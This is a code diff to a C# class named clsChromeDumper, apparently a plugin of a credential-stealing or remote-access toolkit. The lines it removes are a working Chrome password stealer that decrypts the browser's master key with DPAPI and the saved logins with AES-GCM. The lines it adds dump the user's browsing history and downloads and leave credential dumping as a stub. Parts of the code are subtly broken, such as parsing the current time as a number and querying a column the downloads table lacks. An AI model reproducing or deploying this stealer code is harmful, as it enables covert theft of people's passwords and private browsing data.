@@ -11,245 +11,209 @@ using System.Security.Cryptography;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
 using Org.BouncyCastle.Crypto.Parameters;
-using System.Data.SQLite;
+using System.Security.Principal;
+using Org.BouncyCastle.Crypto.Generators;
+using System.Runtime.InteropServices;
 using Newtonsoft.Json;
+using System.Data.SQLite;
 
 namespace Plugin48Dumper
 {
-    internal class clsChromeDumper
+    public class clsChromeDumper : clsDumper
     {
-        public string m_szChromeDirectory { get; set; }
-        public string m_szLoginDataPath { get { return $"{m_szChromeDirectory}\\User Data\\Default\\Login Data"; } }
-        public string m_szLocalState { get { return $"{m_szChromeDirectory}\\User Data\\Local State"; } }
+        private string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        private string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+        private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
+        private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
+
+        private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
+        private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
+        private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }
+
+        private string fnConnString(string szFilePath) => $"Data Source={szFilePath};Version=3;Read Only=True;";
+        private string fnNewTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
 
         public clsChromeDumper()
         {
-            string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
+            Description = "Chrome dumper.";
+            Usage = "foo";
+            Entry = "chrome";
+
+            Available = true;
         }
 
-        public struct stCredential
+        public class clsCredential
         {
-            public string URL { get; set; }
-            public string Username { get; set; }
-            public string Password { get; set; }
-            public DateTime CreationDate { get; set; }
-            public DateTime LastUsedDate { get; set; }
-        }
-        public struct stCookie
-        {
-
-        }
-        public struct stHistory
-        {
-            public string szTitle { get; set; }
-            public string szURL { get; set; }
-            public DateTime dtLastVisited { get; set; }
+            public string URL;
+            public string Username;
+            public string Password;
+            public string szCreationDate;
+            public string szLastUsed;
         }
 
-        private bool fnbIsV10(byte[] data)
+        public class clsHistory
         {
-            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
-            {
-                return true;
-            }
-            else
-            {
-                return false;
-            }
+            public string Title;
+            public string URL;
+            public string szLastUsed;
         }
 
-        private byte[] fnabGetKey()
+        public class clsDownload
         {
-            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
-            string content = File.ReadAllText(FilePath);
-            dynamic json = JsonConvert.DeserializeObject(content);
-            string key = json.os_crypt.encrypted_key;
-            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
-
-            byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);
-
-            return decryptedkey;
+            public string FileName;
+            public string TargetPath;
+            public string URL;
+            public long Length;
+            public string szDate;
         }
 
-        //Initial action
-        private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
+        public class clsBookmark
         {
-            nonce = new byte[12];
-            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
-
-            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
-            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
+            public string Name;
+            public string URL;
+            public string szAddDate;
+            public string szLastUsed;
         }
 
-        private string fnszDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
+        public List<clsCredential> fnlsDumpCredential(int nCount = 100)
         {
-            string sR = string.Empty;
-            try
-            {
-                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
-                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
+            List<clsCredential> ls = new List<clsCredential>();
 
-                cipher.Init(false, parameters);
-                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
-                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
-                cipher.DoFinal(plainBytes, retLen);
 
-                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
-            }
-            catch
-            {
-                return "Decryption failed :(";
-            }
-
-            return sR;
+            return ls;
         }
 
-        //Start extract the user data
-        public List<stCredential> fnPasswordDumper()
+        public List<clsHistory> fnlsDumpHistory(int nCount = 100)
         {
-            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-            string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
-            string temp_path = Environment.SpecialFolder.Templates.ToString();
-            bool is_temp = false;
-            Process[] processlist = Process.GetProcessesByName("chrome");
-            if (processlist.Length != 0)
-            {
-                //If chrome browser is runnning, it is not able to connect Login Data file.
-                File.Copy(LoginDataPath, temp_path + "\\ChromePassword.db");
-                LoginDataPath = temp_path + "\\ChromePassword.db";
-                is_temp = true;
-            }
+            List<clsHistory> ls = new List<clsHistory>();
 
-            byte[] key = fnabGetKey();
+            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
+            File.Copy(HistoryFile, dst, true);
 
-            string connectionString = String.Format("Data Source={0};Version=3;", LoginDataPath);
-
-            SQLiteConnection conn = new SQLiteConnection(connectionString);
-            conn.Open();
-
-            List<stCredential> creds = new List<stCredential>();
-
-            SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
-            //SQLiteCommand cmd = new SQLiteCommand("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins && order by date_last_used", conn);
-            SQLiteDataReader reader = cmd.ExecuteReader();
-
-            while (reader.Read())
-            {
-                byte[] encryptedData = (byte[])reader["password_value"];
-                if (fnbIsV10(encryptedData))
-                {
-                    byte[] nonce, ciphertextTag;
-                    fnPrepare(encryptedData, out nonce, out ciphertextTag);
-                    string password = fnszDecrypt(ciphertextTag, key, nonce);
-                    long date1 = long.Parse(reader["date_created"].ToString());
-                    long date2 = long.Parse(reader["date_last_used"].ToString());
-                    long date_created_convert;
-                    long date_last_login_convert;
-                    if (date1 != 86400000000) { date_created_convert = (date1 - 11644473600000000) / 1000000; } else { date_created_convert = date1; }
-                    if (date2 != 86400000000) { date_last_login_convert = (date2 - 11644473600000000) / 1000000; } else { date_last_login_convert = date2; }
-                    DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                    DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                    convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
-                    convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
-                    if (reader["username_value"].ToString() != "")
-                    {
-                        creds.Add(new stCredential
-                        {
-                            URL = reader["origin_url"].ToString(),
-                            Username = reader["username_value"].ToString(),
-                            Password = password,
-                            CreationDate = convert_date_1,
-                            LastUsedDate = convert_date_2
-                        }); ;
-                    }
-                }
-                else
-                {
-                    string password;
-                    try
-                    {
-                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
-                    }
-                    catch
-                    {
-                        password = "Decryption failed :(";
-                    }
-                    long date1 = long.Parse(reader["date_created"].ToString());
-                    long date2 = long.Parse(reader["date_last_used"].ToString());
-                    long date_created_convert;
-                    long date_last_login_convert;
-                    DateTime epoch_start = new DateTime(1601, 1, 1);
-                    long delta1 = long.Parse(DateTime.Now.ToString()) - date1;
-                    long delta2 = long.Parse(DateTime.Now.ToString()) - date2;
-                    date_created_convert = long.Parse(epoch_start.ToString()) + delta1;
-                    date_last_login_convert = long.Parse(epoch_start.ToString()) + delta2;
-                    DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                    DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
-                    convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
-                    convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
-                    creds.Add(new stCredential
-                    {
-                        URL = reader["origin_url"].ToString(),
-                        Username = reader["username_value"].ToString(),
-                        Password = password,
-                        CreationDate = convert_date_1,
-                        LastUsedDate = convert_date_2
-                    });
-                }
-            }
-            if (is_temp)
-            {
-                File.Delete(temp_path);
-            }
-            return creds;
-        }
-
-        public List<stHistory> fnDumpHistory()
-        {
-            List<stHistory> ls = new List<stHistory>();
-            string szFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
-
-            string szConnStr = $"DataSource=;Version=3;New=False;Compress=True;";
-            using (SQLiteConnection conn = new SQLiteConnection())
+            string szConnString = fnConnString(dst);
+            using (var conn = new SQLiteConnection(szConnString))
             {
                 conn.Open();
-
-                string szQuery = $"SELECT * FROM urls ORDER BY last_visit_time desc";
-                using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(szQuery, conn))
+                using (var cmd = new SQLiteCommand(conn))
                 {
-                    DataSet ds = new DataSet();
-                    adapter.Fill(ds);
+                    string szQuery = @"
+                        SELECT 
+                            CAST(url AS TEXT) AS url,
+                            CAST(title AS TEXT) AS title,
+                            last_visit_time
+                        FROM urls
+                        ORDER BY last_visit_time DESC";
 
-                    if (ds != null && ds.Tables.Count > 0 && ds.Tables[0] != null)
+                    if (nCount != -1 && nCount > 0)
                     {
-                        DataTable dt = ds.Tables[0];
-                        foreach (DataRow dr in dt.Rows)
+                        szQuery += $" LIMIT {nCount}"; 
+                    }
+
+                    cmd.CommandText = szQuery;
+
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
                         {
-                            string szURL = Convert.ToString(dr["url"]);
-                            string szTitle = Convert.ToString(dr["title"]);
+                            string title = reader["title"]?.ToString();
+                            string url = reader["url"]?.ToString();
 
-                            if (string.IsNullOrEmpty(szURL))
-                                continue;
+                            long time = 0;
+                            if (reader["last_visit_time"] != DBNull.Value)
+                                long.TryParse(reader["last_visit_time"].ToString(), out time);
 
-                            long utc_microseconds = Convert.ToInt64(dr["last_visit_time"]);
-                            DateTime gmt_time = DateTime.FromFileTimeUtc(10 * utc_microseconds);
+                            DateTime? dt = fnChromeTimeToDateTime(time);
 
-                            ls.Add(new stHistory()
+                            ls.Add(new clsHistory()
                             {
-                                szURL = szURL,
-                                szTitle = szTitle,
-                                //date
+                                Title = title,
+                                URL = url,
+                                szLastUsed = dt == null ? "N/A" : dt?.ToString("F"),
                             });
                         }
                     }
                 }
-
-                conn.Close();
             }
 
+            File.Delete(dst);
+
             return ls;
+        }
+
+        public List<clsDownload> fnlsDumpDownload(int nCount = 100)
+        {
+            List<clsDownload> ls = new List<clsDownload>();
+
+            string szDst = fnNewTempFilePath();
+            File.Copy(HistoryFile, szDst);
+
+            string szConnStr = fnConnString(szDst);
+            using (var conn = new SQLiteConnection(szConnStr))
+            {
+                conn.Open();
+
+                using (var cmd = new SQLiteCommand(conn))
+                {
+                    string szQuery = $"SELECT target_path, total_bytes, tab_url, end_time FROM downloads ORDER BY last_visit_time DESC";
+                    if (nCount != -1)
+                        szQuery += $" LIMIT {nCount}";
+
+                    cmd.CommandText = szQuery;
+
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            string szTargetPath = reader["target_path"]?.ToString();
+                            long nTotalBytes = long.Parse(reader["total_bytes"]?.ToString());
+                            string szURL = reader["tab_url"]?.ToString();
+                            long nEndTime = long.Parse(reader["end_time"]?.ToString());
+
+                            DateTime? dt = fnChromeTimeToDateTime(nEndTime);
+
+                            ls.Add(new clsDownload()
+                            {
+                                TargetPath = szTargetPath,
+                                Length = nTotalBytes,
+                                URL = szURL,
+                                szDate = dt == null ? "N/A" : dt?.ToString("F"),
+                            });
+                        }
+                    }
+                }
+            }
+
+            File.Delete(szDst);
+
+            return ls;
+        }
+
+        
+
+        public List<clsBookmark> fnlsDumpBookMark(int nCount = 100)
+        {
+            List<clsBookmark> ls = new List<clsBookmark>();
+
+
+            return ls;
+        }
+
+        private static DateTime? fnChromeTimeToDateTime(long webkitTime)
+        {
+            if (webkitTime <= 0)
+                return null;
+
+            try
+            {
+                DateTime epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+
+                return epoch.AddTicks(webkitTime * 10);
+            }
+            catch
+            {
+                return null;
+            }
         }
     }
 }
